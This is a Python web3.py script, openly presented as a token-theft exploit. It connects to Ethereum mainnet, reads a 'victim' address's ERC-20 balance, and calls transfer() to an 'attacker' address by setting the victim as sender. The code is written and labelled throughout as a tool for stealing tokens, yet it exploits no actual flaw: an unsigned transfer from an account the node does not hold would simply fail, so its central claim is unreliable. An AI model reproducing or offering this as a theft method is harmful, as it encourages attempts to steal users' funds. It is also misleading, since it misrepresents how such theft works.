from web3 import Web3

# Configuration
INFURA_URL = 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'
TOKEN_CONTRACT_ADDRESS = '0xYourTokenContractAddress'
ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

# Connect to Ethereum network
def connect_to_eth():
    try:
        web3 = Web3(Web3.HTTPProvider(INFURA_URL))
        if web3.isConnected():
            print("Connected to Ethereum network.")
            return web3
        else:
            raise ConnectionError("Failed to connect to Ethereum network.")
    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)

# Initialize contract
def init_contract(web3):
    return web3.eth.contract(address=TOKEN_CONTRACT_ADDRESS, abi=ABI)

# Exploit token theft
def exploit_token_theft(web3, token_contract):
    attacker_address = '0xAttackerAddress'
    victim_address = '0xVictimAddress'
    amount = 1000  # Amount of tokens to steal

    # Check victim balance
    try:
        victim_balance = token_contract.functions.balanceOf(victim_address).call()
        print(f"Victim's balance: {victim_balance}")

        if victim_balance < amount:
            print("Insufficient balance for the theft.")
            return

        # Perform the transfer
        tx = token_contract.functions.transfer(attacker_address, amount).transact({'from': victim_address})
        receipt = web3.eth.wait_for_transaction_receipt(tx)
        print(f"Successfully transferred {amount} tokens to {attacker_address}.")
        print(f"Transaction receipt: {receipt}")
        
    except Exception as e:
        print(f"Token theft failed: {e}")

if __name__ == "__main__":
    web3 = connect_to_eth()
    token_contract = init_contract(web3)
    exploit_token_theft(web3, token_contract)
